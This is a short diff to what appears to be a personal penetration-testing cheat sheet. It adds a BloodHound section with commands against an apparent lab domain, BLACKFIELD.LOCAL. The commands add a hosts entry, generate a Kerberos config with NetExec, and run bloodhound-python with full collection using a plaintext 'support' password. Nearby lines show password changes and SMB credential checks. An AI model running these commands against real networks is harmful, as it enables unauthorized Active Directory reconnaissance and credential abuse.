@@ -577,5 +577,12 @@ changepasswd.py dataspace.local/PETER@192.168.159.129 \
 Verify:
 nxc smb 192.168.159.129 -u PETER -p 'P*!er!@23'
 
+----------------------------------------------------bloodhound----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+echo "10.129.229.17 DC01.BLACKFIELD.LOCAL BLACKFIELD.LOCAL blackfield.local" | sudo tee -a /etc/hosts
+nxc smb $IP -u 'support' -p '#00^BlackKnight'  --generate-krb5-file blackfield.krb5
+export KRB5_CONFIG=blackfield.krb5
+bloodhound-python -u 'support' -p '#00^BlackKnight' -d BLACKFIELD.LOCAL -ns 10.129.229.17 -c All -dc DC01.BLACKFIELD.LOCAL
+
+
                                                                
 ```
